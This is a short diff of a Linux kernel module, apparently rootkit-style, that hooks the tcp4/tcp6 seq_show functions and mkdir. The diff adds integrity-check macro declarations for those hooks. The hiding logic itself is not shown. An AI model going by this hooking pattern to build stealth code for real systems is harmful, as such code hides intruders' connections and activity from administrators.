@@ -12,6 +12,7 @@
 #include <linux/uaccess.h>
 #include <linux/syscalls.h>
 #include <linux/init.h>
+#include "secure.h"
 #undef pr_fmt
 #define pr_fmt(fmt) "%s : " fmt,__func__
 
@@ -143,6 +144,9 @@ typedef asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq,void *v);
 typedef asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq,void *v);
 static   orig_tcp4_seq_show tcp4;
 static   orig_tcp6_seq_show tcp6;
+DECL_FUNC_CHECK(tcp4,SIG_SEQ_SHOW);
+DECL_FUNC_CHECK(tcp6,SIG_SEQ_SHOW);
+
 static asmlinkage long  hook_tcp4_seq_show(struct seq_file *seq,void *v){
 
     long ret;
@@ -171,7 +175,7 @@ static asmlinkage long  hook_tcp6_seq_show(struct seq_file *seq,void *v){
 #if (MKDIR_HOOK_IS_ENABLED > 0)
 typedef asmlinkage long (*orig_mkdir_t)(const struct pt_regs *);
 static orig_mkdir_t orig_mkdir;
-
+DECL_FUNC_CHECK(orig_mkdir,SIG_MKDIR);
 
 static asmlinkage long hook_mkdir(const struct pt_regs *regs)
 {
